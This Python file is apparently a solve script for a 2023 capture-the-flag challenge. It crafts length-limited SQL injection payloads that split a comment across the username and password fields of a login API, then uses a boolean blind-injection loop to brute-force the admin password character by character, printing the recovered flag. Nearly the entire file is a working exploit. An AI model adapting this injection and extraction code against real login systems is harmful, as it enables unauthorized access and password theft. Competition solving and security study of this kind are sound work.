import json
import re
import string

import boto3
import requests

session = boto3.Session(profile_name="tisc-2023-8")
client = session.client("lambda")


def craft_query(payload):
    print(
        json.loads(
            client.invoke(FunctionName="craft_query", Payload=payload)
            .get("Payload")
            .read()
            .decode()
        )
    )


def pad(s):
    return s + "/*" + "F" * (66 - len(s)) + "\x02"


def sqli(payload, pwpay=""):
    if len(payload) > 66:
        return "too long"
    payload = pad(payload)
    pwpay = "*/" + pwpay + "#"
    # print(repr(payload))
    # craft_query(json.dumps({"username": payload, "password": pwpay}))
    try:
        r = requests.post(
            "http://chals.tisc23.ctf.sg:28471/api/login",
            data={"username": payload, "password": pwpay},
        )
    except requests.exceptions.Timeout:
        # print("timeout")
        return False
    if "reminder?username=" in r.url:
        return True
    # err = re.search(r'<p style="color:red">(.*)</p>', r.text)
    # print(err.group(1) if err else "no error message")
    return False


def brute(payload, pwpay="", s=""):
    while True:
        for c in string.printable:
            print(f"\r{repr(s + c)}     ", end="")
            if c in ["%", "_"]:
                c = f"\\{c}"
            if len(payload.replace("FUZZ", s + c + "%")) > 66:
                return "too long"
            if sqli(
                payload.replace("FUZZ", s + c + "%"), pwpay.replace("FUZZ", s + c + "%")
            ):
                if len(c) == 2:
                    c = c[1]
                # print(c)
                s += c
                # print(s)
                break
        else:
            print()
            break

    return s


print(brute('admin" AND password LIKE BINARY', '"FUZZ"'))  # TISC{a1PhAb3t_0N1Y}
